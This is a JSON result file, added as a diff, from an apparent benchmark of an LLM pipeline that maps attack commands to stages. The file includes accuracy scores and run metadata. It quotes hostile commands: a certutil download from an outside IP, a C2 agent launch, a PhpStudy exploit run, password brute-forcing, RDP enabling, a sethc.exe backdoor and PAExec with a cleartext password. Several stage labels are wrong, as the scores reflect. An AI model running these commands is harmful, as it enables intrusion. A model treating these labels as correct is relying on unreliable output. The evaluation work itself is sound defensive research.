@@ -1,0 +1,92 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"echo start:f98e6367-e38b-4e53-ba83-c58ede5c85fc\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \"whoami&arp -a&ipconfig&ping www.baidu.com -c 1\"'",
+        "stage": "Discovery"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"cmd /c 'python PhpStudyExp2.py http://121.36.30.176/ \"taskkill /f /im agent.exe&certutil -urlcache -split -f http://124.223.85.207:8079/sangforcat.exe C:\\Users\\Public\\agent.exe&cmd /c start /min C:\\Users\\Public\\agent.exe -opid 7fa51253-c053-4b44-94eb-5d8a161b429b -server https://124.223.85.207:8443\"'",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "cmd /c WinBrute.exe administrator_pass.txt administrator",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"reg add \\\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\\" /v fDenyTSConnections /t REG_DWORD /d 0 /f;netsh advfirewall firewall add rule name=\\\"Remote Desktop\\\" dir=in action=allow protocol=TCP localport=3389\"",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"REG ADD \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\\" /v Debugger /t REG_SZ /d \\\"C:\\windows\\system32\\cmd.exe\\\"/f\"",
+        "stage": "Persistence"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"REG ADD \\\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\\\" /v Debugger /t REG_SZ /d \\\"C:\\windows\\system32\\sethc.exe\\\"/f\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "cmd /c PAExec.exe \\\\192.168.0.95 -u administrator -p Data123456! ipconfig",
+        "stage": "Lateral Movement"
+      }
+    ],
+    "narrative": "An unknown adversary breached this Windows system using an initial access vector involving the download of malware via `certutil`. The downloaded executable established communication with its command-and-control server (`https://124.223.85.207`). Further commands were executed through PowerShell scripts with bypassed execution policies, facilitating lateral movement within the network (`http://121.36.30.176`, `\\\\192.168.0.95`), credential collection attempts (`administrator_pass.txt`) and privilege escalation (`registry modification`). Modifications to registry keys allowed persistence (`Debugger key modifications`). A final stage involved defense evasion tactics (`sethc.exe` debugger configuration).",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 10745,
+      "completion_tokens": 1895,
+      "total_tokens": 12640,
+      "wall_clock_s": 64.183,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.6,
+      "recall": 0.75,
+      "f1": 0.6666666666666665,
+      "tp": 6,
+      "fp": 4,
+      "fn": 2
+    },
+    "stage": {
+      "precision": 0.3,
+      "recall": 0.5,
+      "f1": 0.37499999999999994,
+      "tp": 3,
+      "fp": 7,
+      "fn": 3,
+      "recall_partial": 0.5833333333333334
+    },
+    "hallucination_rate": 0.0,
+    "cost": {
+      "llm_calls": 5,
+      "prompt_tokens": 10745,
+      "completion_tokens": 1895,
+      "total_tokens": 12640,
+      "wall_clock_s": 64.183,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
